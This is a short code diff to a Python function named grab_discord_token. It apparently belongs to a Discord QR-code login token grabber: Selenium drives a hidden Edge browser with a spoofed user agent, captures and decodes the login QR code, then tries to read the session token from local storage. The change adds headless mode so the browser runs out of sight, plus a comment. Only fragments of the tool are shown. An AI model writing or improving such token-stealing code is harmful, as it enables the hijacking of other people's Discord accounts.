@@ -16,6 +16,7 @@ def grab_discord_token():
     edge_options = Options()
     edge_options.add_argument("--window-size=1920,1080")
     edge_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+    edge_options.add_argument("--headless")  # Add headless mode
 
     # Initialize the WebDriver
     driver = webdriver.Edge(options=edge_options)
@@ -57,6 +58,7 @@ def grab_discord_token():
     # Crop the image to the element's dimensions
     element_image = image.crop((left, top, right, bottom))
 
+    # Decode the QR code and get the data
     decode_and_display_qr_code(element_image)
 
     # Attempt to grab the token from local storage after login
